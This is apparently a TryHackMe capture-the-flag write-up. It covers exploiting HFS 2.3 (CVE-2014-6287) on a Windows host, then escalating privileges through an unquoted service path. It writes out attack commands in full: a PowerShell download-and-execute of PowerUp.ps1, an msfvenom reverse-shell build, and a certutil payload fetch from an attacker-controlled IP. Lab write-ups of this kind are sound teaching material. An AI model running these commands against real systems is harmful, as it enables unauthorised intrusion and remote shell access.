# Enumeration 

## open ports

```
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                         
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds       
3389/tcp  open  ssl          Microsoft SChannel TLS                       
80/tcp    open  http         Microsoft IIS httpd 8.5    
8080/tcp  open  http         HttpFileServer httpd 2.3                     


```

### Port 8080

![[Pasted image 20230119041559.png]]
HFS 2.3 is vulnerable to CVE 
[CVE-2014-6287](https://www.exploit-db.com/exploits/49584)
changing ip addresses in the script
![[Pasted image 20230119041633.png]]
and run it

# Foothold 


![[Pasted image 20230119041645.png]]

we a re in as bill

# Privesc 

running powerup on the target

` IEX(new-object net.webclient).downloadstring('http://10.10.105.75:8000/PowerUp.ps1') `
![[Pasted image 20230119043241.png]]

![[Pasted image 20230119043254.png]]
we can do unquoted privesc and we have write perm
first we create a reverse shell payload using msfvenom and name it Advanced.exe
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.105.75 LPORT=9002 -f exe -o Advanced.exe`

```
PS C:\Program Files (x86)\IObit> 
certutil -urlcache -f http://10.10.105.75:8000/Advanced.exe Advanced.exe

Restart-Service -Name AdvancedSystemCareService9

```
![[Pasted image 20230119043449.png]]


# Loot



---
Tags: #ctf #thm #unquoted 
Resources: 